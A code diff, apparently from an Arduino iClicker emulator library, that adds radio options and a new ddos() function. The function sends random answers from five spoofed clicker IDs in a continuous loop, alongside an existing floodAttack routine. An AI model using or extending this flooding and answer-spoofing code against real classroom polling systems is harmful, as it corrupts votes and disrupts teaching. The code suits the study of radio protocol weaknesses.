@@ -3,8 +3,8 @@
 
 iClickerEmulator *iClickerEmulator::_self;
 
-iClickerEmulator::iClickerEmulator(uint8_t _cspin, uint8_t _irqpin, uint8_t _irqnum)
-: _radio(_cspin, _irqpin, false, _irqnum)
+iClickerEmulator::iClickerEmulator(uint8_t _cspin, uint8_t _irqpin, uint8_t _irqnum, bool isRFM69HW)
+: _radio(_cspin, _irqpin, isRFM69HW, _irqnum)
 {
     _recvCallback = NULL;
     _self = this; //this sucks
@@ -163,7 +163,7 @@ iClickerAnswer_t iClickerEmulator::charAnswer(char ans)
 }
 
 
-bool iClickerEmulator::submitAnswer(uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_t ans, bool withAck, uint32_t timeout)
+bool iClickerEmulator::submitAnswer(uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_t ans, bool withAck, uint32_t timeout, bool waitClear )
 {
     configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);
 
@@ -179,7 +179,7 @@ bool iClickerEmulator::submitAnswer(uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_
     toSend.answer = encodeAns(id, ans);
 
     //send packet, we can cast toSend to array since all uint8_t bytes
-    _radio.send(&toSend, PAYLOAD_LENGTH_SEND);
+    _radio.send(&toSend, PAYLOAD_LENGTH_SEND, waitClear);
 
     // need to determine packet format!
     if (withAck)
@@ -288,13 +288,30 @@ bool iClickerEmulator::floodAttack(uint32_t num, uint32_t interval)
         randomId(id); //get random id
         ans = randomAnswer();
         //submit answer
-        if(!submitAnswer(id, ans))
+        if(!submitAnswer(id, ans, false))
             return false;
 
         delay(interval);
     }
 
     return true;
+}
+
+void iClickerEmulator::ddos(uint32_t ms)
+{
+    uint32_t start = millis();
+    uint8_t id[5][ICLICKER_ID_LEN];
+
+    for (uint16_t i=0; i < 5; i++)
+        randomId(id[i]);
+
+    while (millis() - start < ms)
+    {
+        for (uint16_t i=0; i < 5; i++)
+            submitAnswer(id[i], randomAnswer(), false);
+
+        delay(0);
+    }
 }
 
 
